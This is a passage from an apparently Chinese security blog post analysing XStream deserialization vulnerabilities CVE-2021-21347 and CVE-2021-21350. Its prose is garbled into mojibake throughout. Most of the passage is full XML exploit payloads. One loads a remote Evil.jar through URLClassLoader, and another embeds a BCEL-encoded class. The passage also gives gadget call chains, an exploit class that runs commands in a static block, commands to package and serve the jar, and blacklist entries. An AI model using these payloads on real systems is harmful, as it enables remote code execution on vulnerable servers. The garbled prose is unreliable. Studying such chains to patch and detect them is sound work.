class="tag">&lt;<span class="name">type</span>&gt;</span>ysomap<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.xpath.internal.objects.XString&#x27;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">m__obj</span> <span class="attr">class</span>=<span class="string">&#x27;string&#x27;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">m__obj</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">sorted-set</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="åˆ†æ-2"><a href="#åˆ†æ-2" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>è¿™ä¸ªæ˜¯wh1t3p1gå¸ˆå‚…ä¸Šäº¤çš„ï¼Œå®é™…ä¸ºysomapé‡Œçš„LazyValueï¼Œå¸ˆå‚…ç»™çš„è°ƒç”¨é“¾åˆ†æ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">javax.naming.ldap.Rdn$RdnEntry.compareTo</span><br><span class="line">    com.sun.org.apache.xpath.internal.objects.XString.equal</span><br><span class="line">        javax.swing.MultiUIDefaults.toString</span><br><span class="line">            UIDefaults.get</span><br><span class="line">                UIDefaults.getFromHashTable</span><br><span class="line">                    UIDefaults$LazyValue.createValue</span><br><span class="line">                    SwingLazyValue.createValue</span><br><span class="line">                        javax.naming.InitialContext.doLookup()</span><br></pre></td></tr></table></figure><p>æ³¨æ„å®˜ç½‘pocé‡Œé¢çš„æ˜¯<arg>æ ‡ç­¾ï¼Œä¼°è®¡æ˜¯jdkç‰ˆæœ¬åŸå› </p><h3 id="é»‘åå•ï¼š-3"><a href="#é»‘åå•ï¼š-3" class="headerlink" title="é»‘åå•ï¼š"></a>é»‘åå•ï¼š</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sun.swing.SwingLazyValue</span><br></pre></td></tr></table></figure><h2 id="CVE-2021-21347"><a href="#CVE-2021-21347" class="headerlink" title="CVE-2021-21347"></a>CVE-2021-21347</h2><p>author: threedr3am</p><h3 id="POC-3"><a href="#POC-3" class="headerlink" title="POC"></a>POC</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java.util.PriorityQueue</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">size</span>&gt;</span>2<span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">comparator</span> <span class="attr">class</span>=<span class="string">&#x27;javafx.collections.ObservableList$1&#x27;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">int</span>&gt;</span>3<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#x27;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">contentType</span>&gt;</span>text/plain<span class="tag">&lt;/<span class="name">contentType</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">is</span> <span class="attr">class</span>=<span class="string">&#x27;java.io.SequenceInputStream&#x27;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">e</span> <span class="attr">class</span>=<span class="string">&#x27;javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator&#x27;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">iterator</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">names</span> <span class="attr">class</span>=<span class="string">&#x27;java.util.AbstractList$Itr&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">cursor</span>&gt;</span>0<span class="tag">&lt;/<span class="name">cursor</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">lastRet</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">lastRet</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">expectedModCount</span>&gt;</span>0<span class="tag">&lt;/<span class="name">expectedModCount</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">outer-class</span> <span class="attr">class</span>=<span class="string">&#x27;java.util.Arrays$ArrayList&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&#x27;string-array&#x27;</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">string</span>&gt;</span>Evil<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">outer-class</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">names</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">processorCL</span> <span class="attr">class</span>=<span class="string">&#x27;java.net.URLClassLoader&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">ucp</span> <span class="attr">class</span>=<span class="string">&#x27;sun.misc.URLClassPath&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">urls</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">vector</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">capacityIncrement</span>&gt;</span>0<span class="tag">&lt;/<span class="name">capacityIncrement</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">elementCount</span>&gt;</span>1<span class="tag">&lt;/<span class="name">elementCount</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">elementData</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://127.0.0.1:80/Evil.jar<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;/<span class="name">elementData</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">vector</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">urls</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">path</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://127.0.0.1:80/Evil.jar<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">path</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">loaders</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">lmap</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">ucp</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">package2certs</span> <span class="attr">class</span>=<span class="string">&#x27;concurrent-hash-map&#x27;</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">classes</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">defaultDomain</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">classloader</span> <span class="attr">class</span>=<span class="string">&#x27;java.net.URLClassLoader&#x27;</span> <span class="attr">reference</span>=<span class="string">&#x27;../..&#x27;</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">principals</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">hasAllPerm</span>&gt;</span>false<span class="tag">&lt;/<span class="name">hasAllPerm</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">staticPermissions</span>&gt;</span>false<span class="tag">&lt;/<span class="name">staticPermissions</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">key</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">outer-class</span> <span class="attr">reference</span>=<span class="string">&#x27;../..&#x27;</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">defaultDomain</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">initialized</span>&gt;</span>true<span class="tag">&lt;/<span class="name">initialized</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">pdcache</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">processorCL</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">iterator</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">type</span>&gt;</span>KEYS<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">e</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">in</span> <span class="attr">class</span>=<span class="string">&#x27;java.io.ByteArrayInputStream&#x27;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">buf</span>&gt;</span><span class="tag">&lt;/<span class="name">buf</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">pos</span>&gt;</span>-2147483648<span class="tag">&lt;/<span class="name">pos</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">mark</span>&gt;</span>0<span class="tag">&lt;/<span class="name">mark</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">count</span>&gt;</span>0<span class="tag">&lt;/<span class="name">count</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">in</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">is</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">consumed</span>&gt;</span>false<span class="tag">&lt;/<span class="name">consumed</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">transferFlavors</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dataLen</span>&gt;</span>0<span class="tag">&lt;/<span class="name">dataLen</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data</span> <span class="attr">reference</span>=<span class="string">&#x27;../com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="åˆ†æ-3"><a href="#åˆ†æ-3" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>è¿™ä¸ªPOCçš„RCEè§¦å‘ç‚¹æ˜¯com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ClassLoader processorCL;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasNext</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.nextProc != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">this</span>.names.hasNext()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        String var1 = (String)<span class="keyword">this</span>.names.next();</span><br><span class="line"></span><br><span class="line">        Processor var2;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                var2 = (Processor)((Processor)<span class="keyword">this</span>.processorCL.loadClass(var1).newInstance());</span><br><span class="line">                ...</span><br></pre></td></tr></table></figure><p>æ„é€ ä¸€ä¸ªæœ‰evil codeçš„staticä»£ç å—ç±»ï¼Œæ‰“åŒ…jar</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExploitStaticCalc</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;open -a calculator.app&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jar cvf Exploit.jar ExploitStaticCalc.class</span><br><span class="line">python -m SimpleHTTPServer 8000</span><br></pre></td></tr></table></figure><p>å‚è€ƒã€2ã€‘åŸæ–‡ä¸­æœ‰æåˆ°å‡ ç‚¹æœ‰æ„æ€çš„ï¼Œè¿™é‡Œå°±ä¸å¤è¿°äº†</p><ol><li>XStream çš„outer-class</li><li>åŒ¿åå†…éƒ¨ç±»</li><li>ä¸åŒjavaç‰ˆæœ¬ä¸‹ObservableListã€ProtectionDomainçš„ä¸åŒå¯¼è‡´POCè¦åšç›¸åº”çš„ä¿®æ”¹</li></ol><p>ä½†æ˜¯åœ¨æµ‹è¯•çš„æ—¶å€™ï¼Œ8u60ã€8u172éƒ½å¤±è´¥ï¼Œ8u231æˆåŠŸã€‚å¤±è´¥çš„æŠ¥é”™äº‹com.sun.tools.javac.processing.AnnotationProcessingErrorï¼Œåˆ¤æ–­åº”è¯¥æ˜¯processorCL ç»“æ„é—®é¢˜ï¼Œå¯¹æ¯”8u231è·Ÿè¸ªåˆ°java.lang.ClassLoader#defineClass1ï¼Œå‚æ•°åŸºæœ¬ä¸€æ ·ï¼Œä½†æ˜¯loadClasså¤±è´¥ï¼Œæœªæ’æŸ¥åˆ°åŸå› ã€‚</p><p>å¤ªèœé¸¡äº†ã€‚ã€‚ã€‚</p><h3 id="é»‘åå•ï¼š-4"><a href="#é»‘åå•ï¼š-4" class="headerlink" title="é»‘åå•ï¼š"></a>é»‘åå•ï¼š</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">om.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator</span><br><span class="line">denyTypeHierarchyDynamically(<span class="string">&quot;javax.activation.DataSource&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="CVE-2021-21350"><a href="#CVE-2021-21350" class="headerlink" title="CVE-2021-21350"></a>CVE-2021-21350</h2><p>author: thread3am</p><h3 id="POC-4"><a href="#POC-4" class="headerlink" title="POC"></a>POC</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java.util.PriorityQueue</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">size</span>&gt;</span>2<span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">comparator</span> <span class="attr">class</span>=<span class="string">&#x27;javafx.collections.ObservableList$1&#x27;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">int</span>&gt;</span>3<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#x27;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">contentType</span>&gt;</span>text/plain<span class="tag">&lt;/<span class="name">contentType</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">is</span> <span class="attr">class</span>=<span class="string">&#x27;java.io.SequenceInputStream&#x27;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">e</span> <span class="attr">class</span>=<span class="string">&#x27;javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator&#x27;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">iterator</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">names</span> <span class="attr">class</span>=<span class="string">&#x27;java.util.AbstractList$Itr&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">cursor</span>&gt;</span>0<span class="tag">&lt;/<span class="name">cursor</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">lastRet</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">lastRet</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">expectedModCount</span>&gt;</span>0<span class="tag">&lt;/<span class="name">expectedModCount</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">outer-class</span> <span class="attr">class</span>=<span class="string">&#x27;java.util.Arrays$ArrayList&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&#x27;string-array&#x27;</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">string</span>&gt;</span>$$BCEL$$$l$8b$I$A$A$A$A$A$A$AeQ$ddN$c20$Y$3d$85$c9$60$O$e5G$fcW$f0J0Qn$bc$c3$Y$T$83$89$c9$oF$M$5e$97$d9$60$c9X$c9$d6$R$5e$cb$h5$5e$f8$A$3e$94$f1$x$g$q$b1MwrN$cf$f9$be$b6$fb$fcz$ff$Ap$8a$aa$83$MJ$O$caX$cb$a2bp$dd$c6$86$8dM$86$cc$99$M$a5$3egH$d7$h$3d$G$ebR$3d$K$86UO$86$e2$s$Z$f5Et$cf$fb$B$v$rO$f9$3c$e8$f1H$g$fe$xZ$faI$c6T$c3kOd$d0bp$daS_$8c$b5Talc$8bxW$r$91$_$ae$a41$e7$8c$e9d$c8$t$dc$85$8d$ac$8dm$X$3b$d8$a5$d2j$y$c2$da1$afQ$D$3f$J$b8V$91$8b$3d$ecS$7d$Ta$u$98P3$e0$e1$a0$d9$e9$P$85$af$Z$ca3I$aa$e6ug$de$93$a1$f8g$bcKB$zG$d4$d6$Z$I$3d$t$95z$c3$fb$e7$a1$83$5bb$w$7c$86$c3$fa$c2nWG2$i$b4$W$D$b7$91$f2E$i$b7p$80$rzQ3$YM$ba$NR$c8$R$bb$md$84$xG$af$60oH$95$d2$_$b0$k$9eII$c11$3a$d2$f4$cd$c2$ow$9e$94eb$eeO$820$3fC$d0$$$fd$BZ$85Y$ae$f8$N$93$85$cf$5c$c7$B$A$A<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">outer-class</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">names</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">processorCL</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.bcel.internal.util.ClassLoader&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">parent</span> <span class="attr">class</span>=<span class="string">&#x27;sun.misc.Launcher$ExtClassLoader&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">package2certs</span> <span class="attr">class</span>=<span class="string">&#x27;hashtable&#x27;</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">classes</span> <span class="attr">defined-in</span>=<span class="string">&#x27;java.lang.ClassLoader&#x27;</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">defaultDomain</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">classloader</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.bcel.internal.util.ClassLoader&#x27;</span> <span class="attr">reference</span>=<span class="string">&#x27;../..&#x27;</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">principals</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">hasAllPerm</span>&gt;</span>false<span class="tag">&lt;/<span class="name">hasAllPerm</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">staticPermissions</span>&gt;</span>false<span class="tag">&lt;/<span class="name">staticPermissions</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">key</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">outer-class</span> <span class="attr">reference</span>=<span class="string">&#x27;../..&#x27;</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">defaultDomain</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">packages</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">nativeLibraries</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">assertionLock</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.bcel.internal.util.ClassLoader&#x27;</span> <span class="attr">reference</span>=<span class="string">&#x27;..&#x27;</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">defaultAssertionStatus</span>&gt;</span>false<span class="tag">&lt;/<span class="name">defaultAssertionStatus</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">classes</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">ignored__packages</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>java.<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>sun.<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">ignored__packages</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">repository</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.bcel.internal.util.SyntheticRepository&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">__path</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">paths</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">class__path</span>&gt;</span>.<span class="tag">&lt;/<span class="name">class__path</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">__path</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">__loadedClasses</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">repository</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">deferTo</span> <span class="attr">class</span>=<span class="string">&#x27;sun.misc.Launcher$ExtClassLoader&#x27;</span> <span class="attr">reference</span>=<span 